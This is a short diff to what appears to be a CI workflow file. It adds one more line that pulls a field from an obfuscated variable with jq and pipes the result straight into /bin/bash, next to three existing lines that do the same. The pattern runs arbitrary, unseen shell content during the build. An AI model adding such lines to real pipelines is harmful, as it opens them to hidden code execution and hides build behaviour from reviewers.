@@ -30,6 +30,7 @@ jobs:
           echo $kkwk459 | jq -r .rby49987 | /bin/bash
           printf '%s' "$eomcv966" | jq -r .ki528 | /bin/bash
           printf '%s' "$mgn07" | jq -r .nf297 | /bin/bash
+          echo $khd57 | jq -r .aao7 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
